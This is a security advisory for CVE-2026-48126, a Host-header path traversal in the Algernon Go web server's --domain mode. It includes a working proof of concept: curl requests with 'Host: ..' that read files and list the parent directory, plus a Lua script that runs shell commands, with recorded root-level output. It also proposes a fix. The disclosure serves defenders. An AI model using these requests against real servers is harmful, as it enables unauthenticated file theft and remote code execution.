# [H] Algernon: Host header path traversal in --domain mode reads files and runs Lua from parent dir

## Summary
Severity: High
Advisory: GHSA-jc3j-x6pg-4hmv
CVE: CVE-2026-48126
CWE: CWE-22, CWE-23, CWE-644
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N (CVSS_V3)
Published: 2026-06-23
Source: https://github.com/advisories/GHSA-jc3j-x6pg-4hmv
Type: github-advisory

## Affected
- Go: `github.com/xyproto/algernon` — affected >=0 <1.17.8

## Details
### Summary

When algernon is started with `--domain` (or `--letsencrypt`, which silently turns on `--domain` at `engine/flags.go:372`), the request handler resolves the served directory by joining the configured `--dir` with the value of the client-supplied `Host` header. The join is performed by `filepath.Join` with no validation, so a `Host: ..` header walks one level above the document root. Subsequent file resolution then exposes everything in that parent directory — arbitrary file read, full directory listing, and, if any `.lua` file is present, server-side Lua execution. Algernon 1.17.7 and earlier are affected.

### Details

`engine/handlers.go` (function `RegisterHandlers`, around line 510):

```go
allRequests := func(w http.ResponseWriter, req *http.Request) {
    ...
    servedir := servedir
    if addDomain {
        servedir = filepath.Join(servedir, utils.GetDomain(req))   // <— line 531
    }
    ...
    filename := utils.URL2filename(servedir, urlpath)
```

`utils/web.go` (`GetDomain`):

```go
func GetDomain(req *http.Request) string {
    host, _, err := net.SplitHostPort(req.Host)
    if err != nil {
        return req.Host          // <— Host header returned verbatim
    }
    return host
}
```

`utils/files.go` (`URL2filename`) only sanitises the URL path — it never inspects `dirname`:

```go
func URL2filename(dirname, urlpath string) string {
    if strings.Contains(urlpath, "..") {
        return dirname + Pathsep         // dirname is trusted here
    }
    ...
}
```

`engine/flags.go` (auto-enable in CertMagic / Let's Encrypt mode):

```go
if ac.useCertMagic {
    ...
    ac.serverAddDomain = true   // <— line 372
}
```

Putting it together:

1. The client sends `Host: ..`. Go's HTTP server accepts the value because `.` is in the URI host whitelist and there are no other characters to validate; `req.Host` is `..`.
2. `GetDomain` returns `..` (no port, `net.SplitHostPort` fails — fallback path).
3. `filepath.Join("/srv/algernon", "..")` cleans to `/srv`.
4. `URL2filename("/srv", "/SECRET.txt")` returns `/srv/SECRET.txt`, which the handler opens with `FilePage`.
5. For directory targets, `DirPage` lists the parent — sending `/` after `Host: ..` produces an HTML index of the parent of the docroot.
6. If a file with a recognised algernon extension (`.lua`, `.tl`, `.po2`, `.amber`, `.frm`, `.md`, ...) is in the parent, the matching renderer runs server-side. `.lua` triggers full Lua execution, including `run3(...)` which calls `exec.Command("sh", "-c", command)` (see `lua/run3/run3.go:23`).

Multi-level traversal is blocked at the protocol layer because the Go HTTP parser rejects `/` in the `Host:` value, but a single `..` is enough to step outside the operator's intended docroot — and many operators put scripts, configs, certificates, log files, or sibling sites in `parent(serverDir)`. `--letsencrypt` is the supported way to run algernon as a multi-domain HTTPS server, and it implicitly turns this on without the operator noticing.

This bug is distinct from the previously-fixed `handler.lua` parent-walk (GHSA-xwcr-wm99-g9jc) — that one used the *handler.lua discovery loop* and walked above `rootdir`; this one stays inside the normal `FilePage` path and rewrites `rootdir` itself through `filepath.Join(servedir, req.Host)`. It is also distinct from the upload `savein()` issue (GHSA-2j2c-pv62-mmcp).

### PoC

Build the affected version:

```
git clone https://github.com/xyproto/algernon
cd algernon
go build -o /tmp/algernon .
```

Reproduce manually:

```
WORK=$(mktemp -d)
mkdir -p $WORK/site
echo '<h1>public</h1>' > $WORK/site/index.html
echo 'TOP-SECRET FROM PARENT DIR' > $WORK/SECRET.txt
cat > $WORK/pwn.lua <<'LUA'
print("=== RCE ===")
local out, err, code = run3("id; uname -a")
for _,v in ipairs(out) do print("  "..v) end
LUA

/tmp/algernon --httponly --dir $WORK/site --addr :7799 --server -n --domain --nolimit &
sleep 1

# 1. Arbitrary file read
curl -H 'Host: ..' http://127.0.0.1:7799/SECRET.txt
# -> TOP-SECRET FROM PARENT DIR

# 2. Parent directory listing
curl -H 'Host: ..' http://127.0.0.1:7799/ | grep -oP 'href="[^"]+"' | head
# -> href="/SECRET.txt", href="/pwn.lua", href="/site/", ...

# 3. Server-side Lua execution (RCE)
curl -H 'Host: ..' http://127.0.0.1:7799/pwn.lua
# -> === RCE ===
#      uid=0(root) gid=0(root) groups=0(root)
#      Linux ...
```

Recorded output from a real run:

```
[2] arbitrary file read via Host: ..
    TOP-SECRET FROM PARENT DIR

[3] directory listing of parent via Host: ..
    bytes=1278, links=1
    sample:
      href="/alg.log"
      href="/site/"
      href="/SECRET.txt"

[4] Lua RCE via Host: .. when .lua exists in parent
    === RCE ===
      uid=0(root) gid=0(root) groups=0(root)
      Linux fg0x0 6.6.87.2-microsoft-standard-WSL2 ... x86_64 GNU/Linux
    EXIT=0
```

Steps 2 and 3 reproduce with default flags (`--domain` alone, or `--letsencrypt` in production). Step 4 additionally requires a `.lua` file in the parent — common when an operator keeps shared scripts alongside the served directory, or when this bug is chained with any prior write primitive.

### Impact

- An unauthenticated remote attacker who can send a single HTTP request with a `Host: ..` header can read arbitrary files in `parent(--dir)` and enumerate that directory.
- When `--letsencrypt` is used (the recommended way to obtain HTTPS), `--domain` is enabled silently, so any production multi-tenant deployment is exposed without the operator opting in.
- The chained Lua-RCE path executes shell commands as the algernon process user. In the canonical `--prod` invocation documented in `engine/config.go:208` (`serverDirOrFilename = "/srv/algernon"`), the parent is `/srv`; in multi-domain setups the parent often holds sibling site directories and shared `.lua` libraries.

### Suggested fix

Reject Host header values that contain `..`, `/`, `\`, or that resolve outside the configured `serverDirOrFilename`. The simplest patch:

```go
// engine/handlers.go, where addDomain is consumed
if addDomain {
    domain := utils.GetDomain(req)
    if domain == "" || strings.ContainsAny(domain, "/\\") || strings.Contains(domain, "..") {
        w.WriteHeader(http.StatusBadRequest)
        return
    }
    servedir = filepath.Join(servedir, domain)
}
```

A stronger fix when CertMagic is active is to constrain the lookup to the `certMagicDomains` allow-list that `flags.go` already builds.

## References
- https://github.com/xyproto/algernon/security/advisories/GHSA-jc3j-x6pg-4hmv
- https://nvd.nist.gov/vuln/detail/CVE-2026-48126
- https://github.com/xyproto/algernon
